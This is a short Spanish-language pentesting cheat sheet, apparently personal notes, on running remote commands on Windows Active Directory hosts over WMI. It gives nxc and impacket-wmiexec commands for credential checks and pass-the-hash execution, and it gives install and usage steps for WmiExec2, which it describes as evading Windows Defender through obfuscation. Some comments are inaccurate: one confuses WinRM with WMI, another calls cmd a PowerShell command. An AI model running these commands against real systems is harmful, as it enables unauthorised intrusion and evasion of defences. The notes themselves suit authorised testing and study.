## Bypassing PowerShell Security 

Tags: #AD #Bypass #AD #WmiExec2 

## 1. VALIDACIÓN DE ACCESO (ANTES DE CONECTAR)

```bash
❯ nxc wmi <IP> -u 'user' -p 'pass'
# Requiere creds válidas → valida si el usuario tiene acceso WMI
# [+] → creds válidas pero sin acceso WMI
# [Pwn3d!] → acceso WinRM confirmado → wmi funciona
```

```bash 
❯ impacket-wmiexec 'Administrator'@<IP> -hashes :NT
# Más sigiloso (no crea servicio)
# Requiere admin local

❯ impacket-wmiexec domain.corp/Administrator@<IP> -hashes :NT
# Variante con dominio
# -no-pass → indica que usas hash, no password

❯ impacket-wmiexec user:pass@<IP>
# Más sigiloso (no crea servicio)
```

## WmiExec2

E**jecutar comandos mediante WMI (Windows Management Instrumentation)** en lugar de usar el método de ejecución habitual de PowerShell. Eso utiliza ofuscación para evadir Windows Defender. 

* [WmiExec2](https://github.com/ice-wzl/wmiexec2)

```bash 
# Descargar e instalar 
❯ git clone https://github.com/ice-wzl/wmiexec2.git && cd wmiexec2 && python3 -m venv .venv && source .venv/bin/activate && pip3 install -r requirements.txt
```

```powershell 
❯ python3 wmiexec2.py Domain.corp/Administrator:'P@$$w0rd123!'@IP_DC --shell-type cmd

	# cmd = Es un comando de Powershell 
	
❯ python3 wmiexec2.py Domain.corp/Administrator@IP_DC -hashes ':NT'
```